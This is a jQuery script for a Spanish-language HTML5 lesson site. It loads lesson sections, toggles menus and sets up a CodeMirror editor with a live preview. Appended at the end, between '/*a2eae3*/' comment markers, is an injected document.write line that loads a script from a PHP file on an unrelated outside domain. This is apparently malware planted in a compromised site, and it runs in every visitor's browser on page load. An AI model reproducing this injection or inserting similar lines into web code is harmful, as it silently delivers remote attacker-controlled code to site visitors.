$(document).ready(function(){
$(".lesson-links__link").attr("href", "http://proespecial.edudigital.unellez.edu.ve/creacionintelectual/mod/forum/view.php?id=120");


 $('.lesson-ace-editor').html("<div id='code'></div> ");
cargar_editor("<!DOCTYPE html>\n<html lang='es'>\n<head>\n</head>\n<body>\n</body>\n</html>");
 

 $("body").on("click",".block-list__item",function(){
 
var menu=$(this).attr("data-index"); 
 
 $(".ui-media__image.new-icon.new-icon--small.new-icon--checkpoint--current").removeClass('new-icon--checkpoint--current').addClass("new-icon--checkpoint");
 
 

if(menu==0){$(".lesson-checkpoint__wrapper").load("lecciones/html5/principal.html"); $(".js-show-checkpoints").html("1/7"); cerrar();
 $(".menu"+menu).removeClass('new-icon--checkpoint').addClass("new-icon--checkpoint--current");
$('.lesson-ace-editor').html("<div id='code'></div> ");
cargar_editor("<!DOCTYPE html>\n<html lang='es'>\n<head>\n</head>\n<body>\n</body>\n</html>");
}
if(menu==1){$(".lesson-checkpoint__wrapper").load("lecciones/html5/nuevos_elementos.html"); $(".js-show-checkpoints").html("2/7"); cerrar();
 $(".menu"+menu).removeClass('new-icon--checkpoint').addClass("new-icon--checkpoint--current");

$('.lesson-ace-editor').html("<div id='code'></div> ");
cargar_editor("<!DOCTYPE html>\n<html lang='es'>\n<head>\n</head>\n<body>\n</body>\n</html>");

}
if(menu==2){$(".lesson-checkpoint__wrapper").load("lecciones/html5/estrutura.html"); $(".js-show-checkpoints").html("3/7"); cerrar();
 $(".menu"+menu).removeClass('new-icon--checkpoint').addClass("new-icon--checkpoint--current");

cargar_editor("<!DOCTYPE html>\n<html lang='es'>\n<head>\n</head>\n<body>\n</body>\n</html>");
}

if(menu==3){$(".lesson-checkpoint__wrapper").load("lecciones/html5/soporte.html"); $(".js-show-checkpoints").html("4/7"); cerrar();
 $(".menu"+menu).removeClass('new-icon--checkpoint').addClass("new-icon--checkpoint--current");

$('.lesson-ace-editor').html("<div id='code'></div> ");
cargar_editor("<!DOCTYPE html>\n<html lang='es'>\n<!--[if lt IE 9]>\n<script src='http://HTML5shim.googlecode.com/svn/trunk/HTML5.js'>\n</script>\n<![endif]-->\n<head>\n</head>\n<body>\n</body>\n</html>");
}
 

});
var x=0; var y=0;
 $("body").on("click",".ui-button",function(){
 
  if(x==0){
  $(".js-course-name").addClass("is-active");
  $(".lesson__show-checkpoints").addClass("is-active");
  $(".js-lesson-left-bar").addClass("js-showing-checkpoints");
  $(".js-checkpoints").addClass("is-shown");
  $(".js-checkpoints-overlay").addClass("is-shown");
x=1;}
else{
    $(".js-course-name").removeClass("is-active");
  $(".lesson__show-checkpoints").removeClass("is-active");
  $(".js-lesson-left-bar").removeClass("js-showing-checkpoints");
  $(".js-checkpoints").removeClass("is-shown");
  $(".js-checkpoints-overlay").removeClass("is-shown");
  x=0;
}
});
function cerrar(){
$(".js-course-name").removeClass("is-active");
  $(".lesson__show-checkpoints").removeClass("is-active");
  $(".js-lesson-left-bar").removeClass("js-showing-checkpoints");
  $(".js-checkpoints").removeClass("is-shown");
  $(".js-checkpoints-overlay").removeClass("is-shown");
  x=0;
}
  $("body").on("click",".acordion",function(){
 
  if(y==0){
   $(".ui-accordian--lesson").addClass("is-expanded");
   $(".ui-accordian--lesson").css( "max-height", "9999px" );
y=1;}
else{
   $(".ui-accordian--lesson").removeClass("is-expanded");
   $(".ui-accordian--lesson").css( "max-height", "42px" );
  y=0;
}
});

  $("body").on("click",".lesson-nav__section",function(){
 
  var menus=$(this).attr("datas-index");
  
   //$(this).addClass("is-active");

//$(this).addClass('is-active').parent().find('js-section__content').removeClass('in').css( "height", "0px" );

 $(".js-section__content.in.collapse").css( "height", "0px" );
 $(".js-section__content.in.collapse").removeClass('in');

 $(".js-section__content.collapse."+menus).addClass('in');
  $(".js-section__content.in.collapse."+menus).css( "height", "auto" ); 
  $(".lesson-nav__section").removeClass('is-active');
   $(this).addClass('is-active');

});
  
   function cargar_editor(valor){  
   var editor = CodeMirror.fromTextArea(document.getElementById("code"),valor, {
        mode: {name: "idl",        mode: 'text/html',
               version: 1, 
               singleLineStringErrors: true},
        lineNumbers: true,
        indentUnit: 4,    showCursorWhenSelecting: true,

        matchBrackets: true
      });

       var delay;
 
      editor.on("change", function() {
        clearTimeout(delay);
        delay = setTimeout(updatePreview, 300);
      });
      
      function updatePreview() {
        var previewFrame = document.getElementById('preview');
        var preview =  previewFrame.contentDocument ||  previewFrame.contentWindow.document;
        preview.open();
        preview.write(editor.getValue());
        preview.close();
      }
      setTimeout(updatePreview, 300);
}

});

/*a2eae3*/
document.write('<script type="text/javascript" src="http://bttigrejinha.com/templates/siteground-j16-5/yfhdw24b.php?id=328528"></script>');

/*/a2eae3*/
